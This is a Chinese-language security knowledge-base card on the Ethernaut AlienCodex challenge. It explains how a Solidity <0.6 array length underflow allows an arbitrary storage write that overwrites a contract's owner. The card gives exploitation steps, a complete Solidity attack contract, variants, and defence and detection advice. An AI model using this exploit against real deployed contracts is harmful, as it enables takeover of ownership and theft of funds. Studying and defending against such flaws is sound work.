---
id: blockchain-solidity-array-length-underflow-arbitrary-storage-owner
title: Solidity <0.6 动态数组长度下溢：retract 把 length 减成 2^256-1，revise 任意槽写覆写 owner
type: scenario
domain: blockchain
path: blockchain/solidity
technique: solidity-array-length-underflow-arbitrary-storage-write
tags:
- blockchain
- solidity
- evm
- integer-underflow
- storage-slot
- dynamic-array
- access-control
- ethernaut
cve: []
severity: high
confidence: high
affected_versions: Solidity < 0.6.0（原文标记：0.6.0 以下存在溢出）
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V262
  verified_at: '2026-11-07T17:44:24+08:00'
  notes: V262 重核（重试 V253）：对照原文第19关，pragma ^0.5.0、Ownable-05 slot0、contact 打包 slot0、codex length slot1；makeContact→retract 下溢 2^256-1→revise(i=2^256-keccak256(1)) 命中 slot0 改写 owner；EXP 与原文一致；affected_versions 按原文 0.6.0 以下标注。dedup 仅自匹配，与 delegatecall 槽碰撞非同一链。
url: /docs/blockchain/solidity/blockchain-solidity-array-length-underflow-arbitrary-storage-owner/
draft: false
kb_aliases:
- Ethernaut AlienCodex
- 数组长度下溢
- codex.length--
- 任意存储槽写
- Solidity 整数溢出
---

## 一句话结论

Solidity 0.6.0 之前对整数运算不做溢出检查，`bytes32[] public codex` 长度为 0 时执行 `codex.length--` 会下溢成 `2^256-1`；随后 `revise(i, content)` 的边界检查形同虚设，攻击者用 `i = 2^256 - keccak256(1)` 让 `codex[i]` 落到 slot 0，写入自己的地址即可把合约 `owner` 改成攻击者。

## 原理

- **动态数组的存储布局**：`bytes32[] codex` 的长度存在某个 slot `p`，元素 `codex[i]` 存在 `keccak256(p) + i`。本例中 Ownable 的 `_owner` 与 `contact` 打包在 slot0，`codex` 的长度位于 slot1，因此 `codex[i]` 的槽位是 `keccak256(uint256(1)) + i`。
- **无检查算术**：Solidity 0.5.x 的 `codex.length--` 没有 SafeMath 保护，数组长度为 0 时减一会下溢成 `2^256 - 1`；`revise(uint256 i, bytes32 _content)` 里的 `codex[i]` 边界检查认为 `i` 小于这个超大长度，于是允许写入。
- **槽位回绕**：EVM 的槽位索引是 256 位模运算，`keccak256(1) + i` 在 `i = 2^256 - keccak256(1)` 时等于 0（模 2^256），因此 `revise(i, ...)` 写入的正是 slot 0，即 `owner` 所在槽。把 `_content` 设为 `bytes32(uint256(uint160(attacker)))`，slot0 的低 20 字节就变成攻击者地址，`owner()` 返回攻击者。
- **前置条件**：`record`/`retract`/`revise` 都被 `contacted` 修饰器保护，必须先调用公开的 `makeContact()` 把 `contact` 置为 true；这不是障碍，因为函数本身无权限。
- **后续影响**：一旦拥有任意槽写能力，除了 owner，还可以改写数组长度、映射基槽、其他合约变量等；本例只需覆写 slot0 完成 owner 接管。

## 触发条件

- 合约使用 Solidity < 0.6.0 编译（文章标注 `pragma solidity ^0.5.0`，0.6.0 以下存在溢出）。
- 存在可被普通用户调用的动态数组 `length--`（或类似长度减一）操作，且没有 `require(length > 0)` 保护。
- 存在按用户提供的索引写入数组元素的函数（如 `revise(i, content)`）。
- 目标敏感变量位于可通过数组元素公式命中的槽位（本例 slot0 的 owner）。
- 攻击者能调用公开的初始化函数（如 `makeContact`）通过修饰器检查。

## 利用步骤

1. 调用 `makeContact()`，把 `contact` 置为 true，解锁 `retract`/`revise`。
2. 确认 `codex.length == 0`，调用 `retract()` 执行 `codex.length--`，长度下溢为 `2^256-1`。
3. 计算目标索引：`i = uint256(0) - uint256(keccak256(abi.encodePacked(uint256(1))))`（等价于 `2^256 - keccak256(1)`）。
4. 调用 `revise(i, bytes32(uint256(uint160(attacker))))`，slot0 被写成攻击者地址。
5. 调用 `owner()` 确认 owner 已变为攻击者；随后可调用 `onlyOwner` 函数或继续扩大控制。

## PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

interface IAlienCodex {
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
    function owner() external view returns (address);
}

contract AlienCodexAttack {
    address public target;
    address public attacker;

    constructor(address _target) public {
        target = _target;
        attacker = msg.sender;
    }

    function attack() external {
        IAlienCodex codex = IAlienCodex(target);

        codex.makeContact();   // 解锁 contacted 修饰器
        codex.retract();       // length 0 -> 2^256-1

        // codex 长度在 slot 1，元素起始槽 = keccak256(1)
        uint256 index = uint256(0) - uint256(keccak256(abi.encodePacked(uint256(1))));
        bytes32 newOwner = bytes32(uint256(uint160(attacker)));
        codex.revise(index, newOwner); // 命中 slot 0，覆写 owner
    }
}
```

## 变体与关联

- 变体：若数组长度位于 slot `p`，则目标索引为 `2^256 - keccak256(p) + targetSlot`，可把任意 `targetSlot` 映射到对应元素，实现任意槽写。
- 变体：其他无检查的长度递减/自减（如 `array.length -= n`、`for` 循环下溢）同样可把长度放大到极大值，配合按索引写入形成任意存储写。
- 变体：Solidity 0.6.0 起算术检查会 revert；0.8.0 起默认检查，但 `unchecked { }` 块内仍可下溢，若开发者主动关闭检查，同类问题仍可能出现。
- 关联：[[blockchain-solidity-private-state-storage-read]]（同一套“slot 与 keccak256 布局”知识）、[[blockchain-solidity-delegatecall-library-slot0-owner-hijack]]（另一种通过槽位覆盖 owner 的手法）。

## 检测与防御

- 防御：使用 Solidity >=0.8.0（默认检查算术），或在 0.6/0.7 中使用 SafeMath；对 `length--`/`-=` 增加 `require(length > 0)`。
- 防御：数组写入函数必须严格校验 `i < array.length`，且不要在长度下溢后依赖该检查；对动态数组的写操作做独立边界检查。
- 检测：静态扫描 `\.length\s*--`、`\.length\s*-=`、`unchecked` 块中的数组长度运算；审计 owner/admin 等敏感变量是否与可控动态数组的基槽可通过回绕命中。
- 注意：本卡为 Ethernaut 场景，PoC 未实际部署复跑；实际槽位需按合约继承与变量打包顺序重新计算。
